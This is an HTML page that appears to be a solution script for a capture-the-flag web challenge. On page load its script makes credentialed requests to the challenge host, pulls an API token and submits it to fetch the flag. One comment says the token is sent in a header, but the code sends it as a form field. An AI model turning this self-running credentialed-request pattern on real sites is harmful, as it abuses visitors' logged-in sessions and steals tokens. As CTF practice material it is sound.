<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>PointerOverflow CTF Flag Fetcher</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body { font-family: system-ui, sans-serif; margin: 2rem; }
    pre { background: #f0f0f0; padding: 1rem; }
  </style>
</head>
<body>
  <h1>Fetching Flag...</h1>
  <pre id="output"></pre>

  <script>
    const out = document.getElementById('output');
    const log = msg => out.textContent += msg + "\n";

    async function call(path, init) {
      const res = await fetch(path, { credentials: 'include', ...init });
      const text = await res.text();
      return { status: res.status, text, json: () => JSON.parse(text) };
    }

    (async () => {
      log("Starting...");

      // 1️⃣ Login
      const loginRes = await call('https://web200-1.pointeroverflowctf.com/login', { method: 'POST' });
      log(`Login: ${loginRes.status} ${loginRes.text}`);

      // 2️⃣ Fetch token
      const tokenRes = await call('https://web200-1.pointeroverflowctf.com/api/token');
      log(`Token response: ${tokenRes.status} ${tokenRes.text}`);

      let token;
      try { token = (await tokenRes.json()).apiToken; } 
      catch (e) { log("Failed to parse token"); return; }
      log(`Token: ${token}`);

      // 3️⃣ Redirect browser to /api/flag with token in header
      log("Redirecting to flag...");
      const form = document.createElement('form');
      form.method = 'GET';
      form.action = 'https://web200-1.pointeroverflowctf.com/api/flag';
      form.target = '_self';

      const input = document.createElement('input');
      input.type = 'hidden';
      input.name = 'X-Flag-Token';
      input.value = token;
      form.appendChild(input);

      document.body.appendChild(form);
      form.submit();
    })();
  </script>
</body>
</html>
